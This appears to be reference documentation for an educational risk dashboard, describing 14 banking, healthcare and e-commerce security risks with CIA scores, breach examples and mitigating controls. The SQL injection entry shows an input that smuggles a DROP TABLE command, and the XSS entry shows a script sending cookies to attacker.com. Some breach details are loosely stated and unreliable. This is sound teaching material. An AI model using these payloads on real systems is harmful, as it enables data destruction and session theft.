# CIA Risk Dashboard - Risk Database Documentation

## Overview

This document provides detailed explanations of all 14 security risks and 28 security controls implemented in the CIA Risk Dashboard. Each risk includes:

- CIA impact breakdown
- Attack type classification
- Real-world breach example
- Available mitigation controls

---

## 🏦 BANKING SYSTEM RISKS

### Risk 1: SQL Injection Attack

**ID:** r1  
**Severity:** CRITICAL  
**CIA Impact:** C:85 I:70 A:10

#### Description
An attacker injects malicious SQL code into user input fields, bypassing the application's access controls and gaining direct database access. This allows stealing customer data, modifying financial records, or deleting transactions.

#### Attack Vector
```sql
Input: ' OR '1'='1'; DROP TABLE accounts;--
Database: SELECT * FROM users WHERE id = ' OR '1'='1'; DROP TABLE accounts;--
Result: Entire accounts table deleted!
```

#### CIA Analysis
- **Confidentiality (85%):** Customer financial records, personal data stolen
- **Integrity (70%):** Account balances modified, transactions altered
- **Availability (10%):** Performance degradation from malicious queries

#### Real-World Example
- **Target:** Multiple banks and fintech companies
- **Impact:** Millions of customer records exposed
- **Lesson:** Always sanitize inputs and use parameterized queries

#### Available Controls
1. **Input Validation** (85% effective, $30K)
   - Whitelist allowed characters
   - Reject suspicious SQL patterns
   - Length limits on inputs

2. **WAF - Web Application Firewall** (95% effective, $50K)
   - Intercepts malicious requests before application
   - Pattern matching against known attacks
   - Real-time threat intelligence updates

---

### Risk 2: Man-in-the-Middle (MITM) Attack

**ID:** r2  
**Severity:** CRITICAL  
**CIA Impact:** C:90 I:75 A:0

#### Description
An attacker positions themselves between client and server, intercepting unencrypted communication. They can eavesdrop on conversations, steal credentials, modify transactions, or perform identity spoofing.

#### Attack Scenario
```
Customer → [Attacker intercepts] → Bank
     ↓ (Unencrypted data sent)
Attacker captures:
  - Login credentials
  - Card numbers
  - Transaction details
  - Session tokens
```

#### CIA Analysis
- **Confidentiality (90%):** All unencrypted data exposed
- **Integrity (75%):** Transaction amounts, recipient modified
- **Availability (0%):** No service disruption

#### Real-World Example
- **Public WiFi:** Coffee shop unencrypted networks
- **Rogue Access Points:** "Free Airport WiFi" honeypots
- **Impact:** Users unknowingly transmit credentials over public networks
- **Famous Case:** Firesheep attacks on Facebook users (2010)

#### Available Controls
1. **TLS/SSL Encryption** (98% effective, $10K)
   - End-to-end encryption using HTTPS
   - TLS 1.2+ mandatory
   - Perfect forward secrecy enabled
   - HSTS headers enforce encryption

2. **Certificate Pinning** (90% effective, $5K)
   - Mobile apps verify server certificates
   - Prevents rogue certificate attacks
   - Reduces man-in-the-middle success rate

---

### Risk 3: DDoS Attack

**ID:** r3  
**Severity:** HIGH  
**CIA Impact:** C:0 I:0 A:95

#### Description
Distributed Denial of Service attacks overwhelm servers with massive traffic volumes from multiple sources, making legitimate customer access impossible. The banking platform becomes completely unavailable.

#### Attack Types
```
1. Volumetric Attacks: Flood with huge data (100+ Gbps)
2. Protocol Attacks: Exploit protocol weaknesses (SYN flood)
3. Application Attacks: Target specific features (login endpoints)
```

#### CIA Analysis
- **Confidentiality (0%):** No data breach
- **Integrity (0%):** No data modification
- **Availability (95%):** Complete service unavailability

#### Real-World Example
- **2016 Dyn DDoS:** 1.2 Tbps attack (largest ever)
- **Affected:** Twitter, Spotify, Netflix, GitHub, PayPal
- **Duration:** 11+ hours of outages
- **Financial Impact:** Millions in lost transactions

#### Available Controls
1. **Rate Limiting** (60% effective, $20K)
   - Limit requests per IP address
   - CAPTCHA for suspicious traffic
   - Temporary blocking of attack sources
   - Challenge-response mechanisms

2. **DDoS Protection Service** (95% effective, $80K)
   - Third-party service (Cloudflare, Akamai, AWS Shield)
   - Scrubs malicious traffic before reaching servers
   - Geo-blocking of attack regions
   - Anycast routing distributes traffic

---

### Risk 4: Phishing Attack

**ID:** r4  
**Severity:** HIGH  
**CIA Impact:** C:80 I:0 A:0

#### Description
Attackers send fake emails impersonating the bank, tricking users into revealing credentials, security questions, or personal information. These credentials are then used for account takeover.

#### Phishing Email Example
```
From: security@bank-online-secure.com (spoofed)
Subject: Urgent: Verify Your Account

Dear Customer,

Your account has been flagged for security review.
Please click below to verify your identity:
https://bank-online-secure-verify.info/login.php

This is a PHISHING attempt! 🚨
```

#### CIA Analysis
- **Confidentiality (80%):** User credentials exposed
- **Integrity (0%):** No data modification in phishing itself
- **Availability (0%):** No service disruption

#### Real-World Example
- **Spear Phishing:** Targeted attacks on employees
- **Clone Phishing:** Perfect replicas of legitimate emails
- **Success Rate:** 3-10% of targeted users fall for it
- **Cost:** Millions in fraudulent transfers

#### Available Controls
1. **Email Security & DMARC** (85% effective, $15K)
   - SPF (Sender Policy Framework) verification
   - DKIM digital signatures
   - DMARC policy enforcement
   - Email authentication headers

2. **User Security Awareness Training** (70% effective, $25K)
   - Regular phishing simulation campaigns
   - Employee education on red flags
   - Clear reporting procedures
   - Culture of security awareness

---

### Risk 5: Weak Password Policies

**ID:** r5  
**Severity:** HIGH  
**CIA Impact:** C:75 I:50 A:0

#### Description
Users create weak, memorable passwords that are easily guessed or brute-forced. Common passwords like "password123" or "123456" allow attackers to compromise accounts with minimal effort.

#### Weak Password Statistics
```
Most Common Passwords:
1. password
2. 123456
3. 12345678
4. qwerty
5. abc123

These account for 20%+ of ALL passwords!
```

#### CIA Analysis
- **Confidentiality (75%):** Account compromise leads to data theft
- **Integrity (50%):** Attacker can modify account details
- **Availability (0%):** No service disruption

#### Real-World Example
- **LinkedIn Breach (2012):** 6.5M accounts with weak passwords compromised
- **Adobe Breach (2013):** 150M accounts with weak/no passwords
- **Impact:** Credential stuffing attacks across platforms
- **Lesson:** Humans are terrible at passwords

#### Available Controls
1. **Multi-Factor Authentication (MFA)** (95% effective, $40K)
   - Password + SMS code
   - Password + authenticator app (TOTP)
   - Biometric authentication
   - Hardware security keys

2. **Password Manager & Policy Enforcement** (85% effective, $20K)
   - Enforce minimum 12 character passwords
   - Require mixed case, numbers, symbols
   - Regular password change requirements (90 days)
   - Prevent password reuse history

---

## 🏥 HEALTHCARE SYSTEM RISKS

### Risk 6: Ransomware Attack

**ID:** r6  
**Severity:** CRITICAL  
**CIA Impact:** C:90 I:100 A:95

#### Description
Malware encrypts patient medical records, system files, and backups. Attackers demand payment for decryption keys. Without access to patient records, hospitals cannot provide care.

#### Ransomware Attack Timeline
```
T+0min:  Malware enters system via email attachment
T+10min: Encrypts all patient databases
T+30min: Backup systems also encrypted
T+60min: Ransom note appears: "Pay $5M or lose all data"
T+∞:    Data remains inaccessible unless paid
```

#### CIA Analysis
- **Confidentiality (90%):** Patient data exfiltrated before encryption
- **Integrity (100%):** All data becomes inaccessible/unusable
- **Availability (95%):** Critical systems completely down

#### Real-World Example
- **2017 WannaCry Ransomware:** Targeted NHS hospitals
- **Affected:** UK National Health Service
- **Impact:** Surgeries cancelled, patients turned away
- **Cost:** £92 million to NHS
- **Lesson:** Critical infrastructure is prime target

#### Available Controls
1. **Regular Backups & Disaster Recovery** (98% effective, $60K)
   - Daily offline backups (3-2-1 rule)
   - Tested recovery procedures
   - Immutable backup copies
   - Geographic distribution of backups

2. **Endpoint Protection & EDR** (90% effective, $45K)
   - Advanced threat detection
   - Behavioral analysis catches unknown malware
   - Automatic threat response
   - Real-time monitoring and logging

---

### Risk 7: Insider Threat - Data Exfiltration

**ID:** r7  
**Severity:** CRITICAL  
**CIA Impact:** C:95 I:0 A:0

#### Description
A disgruntled or financially motivated employee/contractor with legitimate database access steals patient medical records and sells them on the dark web or to competitors.

#### Insider Threat Profile
```
Characteristics:
  - Access to sensitive systems (legitimate)
  - High privilege level
  - Recent negative event (layoff warning, poor review)
  - Financial motivation
  - Technical capability

Methods:
  - Copy data to USB drive
  - Email sensitive files
  - Upload to cloud storage
  - Use backup/export functionality
```

#### CIA Analysis
- **Confidentiality (95%):** Sensitive medical records stolen
- **Integrity (0%):** Data not modified
- **Availability (0%):** No service disruption

#### Real-World Example
- **Uber Breach (2016):** Engineer accessed 57M customer records
- **Tesla (2020):** Employee stole manufacturing secrets
- **Cost:** Medical records worth $1000+ each on dark web
- **Lesson:** Insider threats are from trusted staff

#### Available Controls
1. **Data Loss Prevention (DLP)** (85% effective, $50K)
   - Monitor unusual data transfers
   - Block unauthorized cloud uploads
   - Watermarking of sensitive documents
   - USB device restrictions

2. **Access Control & Monitoring** (80% effective, $35K)
   - Role-based access (principle of least privilege)
   - User behavior analytics (UBA)
   - Detailed audit logs
   - Regular access reviews

---

### Risk 8: Medical Device Tampering

**ID:** r8  
**Severity:** CRITICAL  
**CIA Impact:** C:50 I:100 A:90

#### Description
Attacker modifies medical device firmware, altering device behavior or settings. This could result in incorrect dosing, false readings, or patient harm.

#### Attack Scenario
```
Attacker:
  1. Exploits network vulnerability
  2. Accesses pacemaker wirelessly
  3. Modifies firmware
  4. Changes heart rate thresholds
  
Result: Patient receives incorrect pacing → cardiac emergency
```

#### CIA Analysis
- **Confidentiality (50%):** Device data somewhat protected by design
- **Integrity (100%):** Device behavior completely compromised
- **Availability (90%):** Device malfunction = unavailable to patient

#### Real-World Example
- **FDA Warnings on Pacemakers:** Multiple manufacturers vulnerable
- **Insulin Pump Recalls:** Security flaws in connected devices
- **Impact:** Potential patient harm and death
- **Lesson:** IoT devices in healthcare pose serious risks

#### Available Controls
1. **Device Firmware Security & Updates** (85% effective, $70K)
   - Secure boot processes
   - Cryptographic code signing
   - Regular security patches
   - Version verification

2. **Network Segmentation & ICS Firewall** (90% effective, $55K)
   - Isolated medical device network
   - Industrial Control Systems (ICS) firewall
   - Restrict device communication
   - Monitor for anomalies

---

### Risk 9: Patient Privacy Breach (HIPAA Violation)

**ID:** r9  
**Severity:** HIGH  
**CIA Impact:** C:95 I:20 A:0

#### Description
Unauthorized access to Protected Health Information (PHI) either through security weakness or insider access. Patient medical conditions, medications, and treatments exposed.

#### HIPAA Violation Example
```
Scenario: Nurse accesses patient records without authorization
Data Exposed:
  - Medical conditions (HIV status, cancer, psychiatric)
  - Medications (addiction treatments, mental health)
  - Treatment history
  - Insurance information

Result: Patient privacy violated, legal liability
```

#### CIA Analysis
- **Confidentiality (95%):** Sensitive health data exposed
- **Integrity (20%):** Minor risk of modification
- **Availability (0%):** No service disruption

#### Real-World Example
- **Anthem Health Breach (2015):** 78.8 million records stolen
- **Impact:** Largest healthcare breach ever
- **Cost:** $115 million settlement
- **Lesson:** Healthcare is high-value target for attacks

#### Available Controls
1. **Encryption of Data at Rest & In Transit** (95% effective, $40K)
   - AES-256 encryption for stored data
   - TLS 1.2+ for data in motion
   - End-to-end encryption
   - Key management system (HSM)

2. **Access Control & Role-Based Permissions** (85% effective, $30K)
   - Principle of least privilege
   - Role-based access (RBAC)
   - Automatic access revocation
   - Regular permission audits

---

## 🛒 E-COMMERCE PLATFORM RISKS

### Risk 10: Credit Card Fraud

**ID:** r10  
**Severity:** HIGH  
**CIA Impact:** C:85 I:70 A:0

#### Description
Stolen credit card information (from database breach, phishing, or skimming) used for unauthorized purchases. Results in customer financial loss and chargebacks.

#### Fraud Attack Flow
```
1. Attacker obtains credit card data
2. Makes test transaction ($1)
3. If successful, makes large purchases
4. Ships to drop address or resells online
5. Customer disputes charge → Merchant loses money
```

#### CIA Analysis
- **Confidentiality (85%):** Credit card data stolen
- **Integrity (70%):** Transaction amounts, items modified
- **Availability (0%):** No service disruption

#### Real-World Example
- **Target Breach (2013):** 40 million card numbers stolen
- **Home Depot Breach (2014):** 56 million card numbers exposed
- **Impact:** $22.6 billion annual fraud losses
- **Lesson:** Payment card data is gold for attackers

#### Available Controls
1. **PCI-DSS Compliance & Tokenization** (95% effective, $50K)
   - Replace sensitive data with tokens
   - Don't store full card numbers
   - Compliance with Payment Card Industry standards
   - Encrypted card processing

2. **Fraud Detection System (ML-based)** (85% effective, $60K)
   - Machine learning anomaly detection
   - Identify suspicious patterns
   - Real-time transaction blocking
   - Velocity checks (too many transactions)

---

### Risk 11: Cross-Site Scripting (XSS)

**ID:** r11  
**Severity:** HIGH  
**CIA Impact:** C:80 I:60 A:0

#### Description
Attacker injects malicious JavaScript into the website, which runs in customers' browsers. Can steal session cookies, credentials, or redirect to phishing sites.

#### XSS Attack Example
```html
<!-- Innocent product review field -->
<input type="text" name="review" />

<!-- Attacker enters: -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Result: All customer cookies sent to attacker -->
```

#### CIA Analysis
- **Confidentiality (80%):** Session tokens, personal data stolen
- **Integrity (60%):** Website content defaced or modified
- **Availability (0%):** No service disruption

#### Real-World Example
- **eBay XSS (2015):** Attackers redirected users to phishing
- **Amazon Review XSS:** Malicious reviews executed scripts
- **Impact:** Credential theft, malware distribution
- **Lesson:** Always sanitize user input

#### Available Controls
1. **Input/Output Encoding & CSP** (90% effective, $25K)
   - HTML entity encoding
   - Context-appropriate encoding
   - Content Security Policy headers
   - JavaScript sandbox restrictions

2. **Web Application Firewall (WAF)** (85% effective, $40K)
   - Pattern matching against known XSS vectors
   - Blocks suspicious requests
   - Real-time threat intelligence
   - Custom security rules

---

### Risk 12: Inventory Database Tampering

**ID:** r12  
**Severity:** CRITICAL  
**CIA Impact:** C:20 I:95 A:0

#### Description
Attacker modifies product prices, inventory levels, or order details directly in the database. Results in financial loss and business logic corruption.

#### Tampering Scenario
```
Attacker modifications:
  - iPhone price: $999 → $1 (massive loss)
  - Stock quantity: 100 → 10000 (overselling)
  - Order total: $1000 → $0.01 (theft)
  
Result: Business loses millions in fraudulent transactions
```

#### CIA Analysis
- **Confidentiality (20%):** Minimal data exposure
- **Integrity (95%):** Data completely unreliable
- **Availability (0%):** Service still operational

#### Real-World Example
- **Retail Chain Breach:** Insider modified prices for personal profit
- **Marketplace Attack:** Fraudster altered order amounts
- **Impact:** Undetected for months, massive financial loss
- **Lesson:** Data integrity is critical for business logic

#### Available Controls
1. **Database Encryption & Integrity Checks** (90% effective, $35K)
   - Transparent Data Encryption (TDE)
   - HMAC checksums on sensitive fields
   - Database activity monitoring
   - Integrity constraint enforcement

2. **Audit Logging & Change Management** (85% effective, $30K)
   - Immutable audit trails
   - Track all database changes
   - Who, what, when, why logging
   - Change approval workflows

---

### Risk 13: Account Takeover (ATO)

**ID:** r13  
**Severity:** HIGH  
**CIA Impact:** C:70 I:80 A:0

#### Description
Attacker gains control of customer account using stolen credentials or session hijacking, then purchases goods, modifies personal information, or performs fraud.

#### Account Takeover Steps
```
1. Obtain password (credential stuffing, data breach)
2. Bypass authentication (exploit weak security)
3. Change email/phone number
4. Make purchases on customer's dime
5. Customer unaware until billing statement
```

#### CIA Analysis
- **Confidentiality (70%):** Personal and payment data exposed
- **Integrity (80%):** Account details, orders modified
- **Availability (0%):** No service disruption

#### Real-World Example
- **Amazon Account Takeover:** Widespread issue for years
- **Apple ID Hijacking:** iCloud photos deleted and ransomed
- **Cost:** $6 billion annual ATO losses
- **Lesson:** Passwords alone insufficient

#### Available Controls
1. **Multi-Factor Authentication (MFA)** (95% effective, $35K)
   - SMS/Email verification
   - Authenticator apps (TOTP)
   - Hardware security keys
   - Biometric authentication

2. **Behavioral Analytics & Risk Scoring** (80% effective, $45K)
   - Detect unusual login locations
   - Monitor for device fingerprint changes
   - Velocity checks (multiple logins)
   - Trigger additional verification

---

### Risk 14: Website Downtime / Server Outage

**ID:** r14  
**Severity:** HIGH  
**CIA Impact:** C:0 I:0 A:95

#### Description
Infrastructure failure, network issue, or software crash causes the e-commerce platform to become unavailable. Customers cannot browse, purchase, or access accounts.

#### Outage Causes
```
1. Server hardware failure
2. Network connectivity loss
3. Database server crash
4. Software bug/code deployment
5. Resource exhaustion
```

#### CIA Analysis
- **Confidentiality (0%):** No data breach
- **Integrity (0%):** No data modification
- **Availability (95%):** Service completely unavailable

#### Real-World Example
- **AWS Outage (2012):** 4-hour outage affected Netflix, Airbnb
- **Facebook Outage (2014):** 11-minute global outage
- **Cost:** $5.6 billion/year in e-commerce downtime losses
- **Lesson:** High availability is critical for revenue

#### Available Controls
1. **High Availability & Load Balancing** (90% effective, $70K)
   - Multiple redundant servers
   - Automatic failover
   - Geographic distribution
   - Session replication

2. **Cloud Auto-Scaling & CDN** (85% effective, $50K)
   - AWS/Azure auto-scaling services
   - Content Delivery Network (CDN)
   - Elastic load balancing
   - Distributed caching

---

## 🛡️ SECURITY CONTROLS SUMMARY

### Control Categories

**Total Controls: 28**

#### Cryptography-Based (7)
- TLS/SSL Encryption
- AES-256 Encryption
- Digital Signatures
- HMAC/Checksums
- Certificate Pinning
- Database Encryption (TDE)
- End-to-End Encryption

#### Access Control (6)
- Multi-Factor Authentication (MFA)
- Role-Based Access Control (RBAC)
- Principle of Least Privilege
- Single Sign-On (SSO)
- Biometric Authentication
- Behavioral Analytics

#### Detection & Prevention (8)
- Web Application Firewall (WAF)
- Intrusion Detection System (IDS)
- Data Loss Prevention (DLP)
- DDoS Protection Service
- Endpoint Protection & EDR
- Email Security (DMARC/SPF)
- Fraud Detection (ML)
- Rate Limiting

#### Operational Security (7)
- Regular Backups
- Security Awareness Training
- Audit Logging
- Change Management
- Vulnerability Scanning
- Penetration Testing
- Incident Response

---

## 📊 Risk-Control Mapping

### Which Controls Protect Which Risks?

| Control | Protects | Effectiveness |
|---------|----------|---------------|
| MFA | Weak Passwords, Account Takeover, Phishing | 95% |
| TLS/SSL | MITM, Phishing | 98% |
| Input Validation | SQL Injection, XSS | 85% |
| Encryption | All Confidentiality Risks | 95% |
| Backups | Ransomware, Availability | 98% |
| DLP | Insider Threats | 85% |
| WAF | SQL Injection, XSS | 90% |
| DDoS Protection | DDoS Attacks | 95% |

---

## 🎯 Risk Selection Rationale

### Why These 14 Risks?

1. **Real-World Relevance**
   - Based on OWASP Top 10
   - Align with NIST frameworks
   - Reference actual breaches

2. **Educational Value**
   - Cover all three CIA pillars
   - Different attack vectors
   - Various severity levels

3. **Industry Diversity**
   - Banking: Financial security threats
   - Healthcare: Life-critical systems
   - E-commerce: Customer-facing risks

4. **Balance**
   -5 Banking risks
   - 4 Healthcare risks
   - 5 E-commerce risks
   - Covers 80% of real-world incidents

---

## 📖 How to Use This Reference

1. **Understanding a Risk:** Read the description and attack scenario
2. **Learning CIA Impact:** Check the breakdown by pillar
3. **Real-World Context:** Study the example and financial impact
4. **Mitigation:** Review available controls and their effectiveness
5. **Implementation:** Use cost and effort to prioritize controls

---

**Last Updated:** September 2024  
**Version:** 1.0  
**Status:** Complete & Verified ✅